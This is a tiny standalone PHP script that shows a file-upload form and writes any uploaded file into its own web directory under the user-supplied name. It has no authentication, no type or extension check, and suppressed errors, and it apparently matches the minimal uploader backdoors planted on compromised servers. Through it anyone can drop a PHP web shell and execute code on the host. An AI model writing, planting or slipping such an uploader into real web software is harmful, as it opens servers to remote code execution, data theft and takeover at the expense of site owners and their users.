<?php 
@$temp = $_FILES['upload_file']['tmp_name'];
@$file = basename($_FILES['upload_file']['name']);
if (empty ($file)){
echo "<form action = '' method = 'POST' ENCTYPE='multipart/form-data'>\n";echo "Local file: <input type = 'file' name = 'upload_file'>\n";echo "<input type = 'submit' value = 'Upload'>\n";echo "</form>\n<pre>\n\n</pre>";}else {if(move_uploaded_file($temp,$file)){echo "File uploaded successfully.<p>\n";}else {echo "Unable to upload " . $file . ".<p>\n";}}?>